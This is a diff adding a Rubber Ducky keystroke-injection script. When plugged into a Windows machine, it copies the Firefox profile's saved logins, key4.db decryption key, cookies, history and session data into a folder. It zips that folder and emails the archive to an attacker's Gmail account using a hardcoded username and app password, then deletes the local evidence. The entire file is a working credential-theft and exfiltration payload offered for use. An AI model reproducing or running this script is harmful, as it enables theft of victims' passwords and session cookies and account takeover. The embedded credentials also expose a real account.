@@ -1,0 +1,109 @@
+REM Open Command Prompt
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+
+REM Change directory to Firefox profile folder
+STRING cd %APPDATA%\Mozilla\Firefox\Profiles
+ENTER
+DELAY 500
+
+REM Change to the first profile folder (You may need to adjust the folder name if you have multiple profiles)
+STRING cd yznjisd3.default-release
+ENTER
+DELAY 500
+
+
+STRING mkdir "%USERPROFILE%\Desktop\duck"
+ENTER
+DELAY 500
+
+STRING copy places.sqlite "%USERPROFILE%\Desktop\duck\places.sqlite"
+ENTER
+DELAY 1000
+
+STRING xcopy bookmarkbackups "%USERPROFILE%\Desktop\duck" /E /I /Y
+ENTER
+DELAY 500
+
+STRING copy logins.json "%USERPROFILE%\Desktop\duck\logins.json"
+ENTER
+DELAY 1000
+
+STRING copy key4.db "%USERPROFILE%\Desktop\duck\key4.db"
+ENTER
+DELAY 1000
+
+STRING copy cookies.sqlite "%USERPROFILE%\Desktop\duck\cookies.sqlite"
+ENTER
+DELAY 1000
+
+
+STRING copy sessionstore.jsonlz4 "%USERPROFILE%\Desktop\duck\sessionstore.jsonlz4"
+ENTER
+DELAY 1000
+
+STRING cd "%USERPROFILE%/Desktop"
+ENTER
+DELAY 500
+
+STRING powershell -command "Compress-Archive -Path duck -DestinationPath duck.zip"
+ENTER
+DELAY 3000
+
+
+STRING powershell
+ENTER
+DELAY 1000
+
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPPort = 587
+ENTER
+STRING $SMTPUsername = 'sakshammaxwell1891@gmail.com'
+ENTER
+STRING $SMTPPassword = 'swwnofjumzxunaxk'
+ENTER
+STRING $EmailTo = 'sakshammaxwell1891@gmail.com'
+ENTER
+STRING $Subject = 'Duck Folder ZIP'
+ENTER
+STRING $Body = 'ZIP file of the Duck folder.'
+ENTER
+STRING $Attachment = "$env:USERPROFILE\Desktop\duck.zip"
+ENTER
+STRING $Message = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $Message.From = $SMTPUsername
+ENTER
+STRING $Message.To.Add($EmailTo)
+ENTER
+STRING $Message.Subject = $Subject
+ENTER
+STRING $Message.Body = $Body
+ENTER
+STRING $AttachmentData = New-Object System.Net.Mail.Attachment($Attachment)
+ENTER
+STRING $Message.Attachments.Add($AttachmentData)
+ENTER
+STRING $SMTPClient = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
+ENTER
+STRING $SMTPClient.EnableSsl = $true
+ENTER
+STRING $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($SMTPUsername, $SMTPPassword)
+ENTER
+STRING $SMTPClient.Send($Message)
+ENTER
+DELAY 10000
+
+STRING Remove-Item -Path "duck" -Force -Recurse
+ENTER
+STRING Remove-Item -Path "duck.zip" -Force -Recurse
+ENTER
+STRING exit
+ENTER
+STRING exit
+ENTER
